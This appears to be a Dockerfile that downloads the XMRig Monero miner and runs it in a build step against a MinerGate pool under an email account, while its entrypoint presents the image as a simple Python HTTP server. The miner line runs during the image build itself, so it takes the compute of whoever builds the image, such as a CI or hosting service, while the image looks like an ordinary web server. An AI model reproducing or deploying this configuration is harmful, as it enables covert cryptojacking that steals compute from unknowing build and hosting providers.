FROM ubuntu:bionic

SHELL ["/bin/bash", "-c"] 

RUN apt-get update && apt-get install -y \
    screen \
    openssh-client \
    openssh-server \
    wget \
    ocl-icd-libopencl1 \
    libmicrohttpd-dev \
    libc6 \
    libstdc++6

WORKDIR /root
RUN wget https://github.com/xmrig/xmrig/releases/download/v2.14.1/xmrig-2.14.1-xenial-x64.tar.gz
RUN tar -xzvf xmr*
WORKDIR /root/xmrig-2.14.1
RUN ./xmrig -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x

ENTRYPOINT ["python3", "-m", "http.server"]